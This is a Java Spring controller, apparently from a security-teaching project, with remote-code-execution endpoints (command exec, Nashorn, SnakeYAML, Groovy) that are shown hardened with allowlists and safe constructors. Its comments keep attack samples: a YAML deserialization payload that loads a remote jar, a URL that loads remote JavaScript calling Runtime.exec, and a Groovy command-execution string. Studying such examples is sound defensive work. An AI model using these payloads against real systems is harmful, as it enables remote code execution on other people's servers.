package org.joychou.controller;

import org.joychou.util.WebUtils;
import groovy.lang.GroovyShell;
import jdk.nashorn.api.scripting.ClassFilter;
import jdk.nashorn.api.scripting.NashornScriptEngineFactory;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.ast.expr.BinaryExpression;
import org.codehaus.groovy.ast.expr.ConstantExpression;
import org.codehaus.groovy.ast.expr.Expression;
import org.codehaus.groovy.ast.expr.UnaryMinusExpression;
import org.codehaus.groovy.ast.expr.UnaryPlusExpression;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.codehaus.groovy.syntax.Types;
import org.joychou.security.SecurityUtil;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.regex.Pattern;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Pattern GROOVY_ARITHMETIC = Pattern.compile("^[0-9+\\-*/(). ]{1,200}$");

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        StringBuilder sb = new StringBuilder();

        // Allowlisted program + validated args, executed without a shell.
        String[] argv = SecurityUtil.cmdArgv(cmd);
        if (null == argv) {
            return "Bad boy. I got u.";
        }

        try {
            Process p = new ProcessBuilder(argv).start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return WebUtils.htmlEscape(e.toString());
        }
        return WebUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        // Allowlisted program + validated args; no "/bin/sh -c" so no shell metacharacters.
        String[] arrCmd = SecurityUtil.cmdArgv(cmd);
        if (null == arrCmd) {
            return "Bad boy. I got u.";
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) throws Exception{
        // Only load scripts from allowlisted (safe) domains over http(s).
        String safeUrl = SecurityUtil.checkURL(jsurl);
        if (null == safeUrl) {
            return "Bad boy. I got u.";
        }
        // js nashorn javascript ecmascript. The class filter denies all access to Java classes
        // (java.lang.Runtime, ProcessBuilder, ...), so the loaded script cannot run commands.
        ScriptEngine engine = new NashornScriptEngineFactory().getScriptEngine(new ClassFilter() {
            @Override
            public boolean exposeToScripts(String className) {
                return false;
            }
        });
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        // Pass the URL as a bound variable instead of concatenating it into script source.
        bindings.put("jsurl", safeUrl);
        engine.eval("load(jsurl)", bindings);
        return "ok";
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // SafeConstructor only builds standard YAML types; arbitrary class instantiation (!!javax.script...) is rejected.
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public String groovyshell(String content) {
        // Only plain arithmetic is accepted: digits, operators, parentheses and spaces. No identifiers,
        // strings, annotations or method calls can be expressed, so no code can be injected.
        if (null == content || !GROOVY_ARITHMETIC.matcher(content).matches()) {
            return "Bad boy. I got u.";
        }
        // Defense in depth: AST allowlist limits the compiled script to constants and arithmetic.
        SecureASTCustomizer secure = new SecureASTCustomizer();
        secure.setMethodDefinitionAllowed(false);
        secure.setClosuresAllowed(false);
        secure.setIndirectImportCheckEnabled(true);
        secure.setAllowedImports(new ArrayList<String>());
        secure.setAllowedStarImports(new ArrayList<String>());
        secure.setAllowedStaticImports(new ArrayList<String>());
        secure.setAllowedStaticStarImports(new ArrayList<String>());
        secure.setAllowedExpressions(Arrays.<Class<? extends Expression>>asList(
                ConstantExpression.class, BinaryExpression.class, UnaryMinusExpression.class,
                UnaryPlusExpression.class));
        secure.setAllowedTokens(Arrays.asList(Types.PLUS, Types.MINUS, Types.MULTIPLY, Types.DIVIDE));
        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secure);
        GroovyShell groovyShell = new GroovyShell(config);
        return String.valueOf(groovyShell.evaluate(content));
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

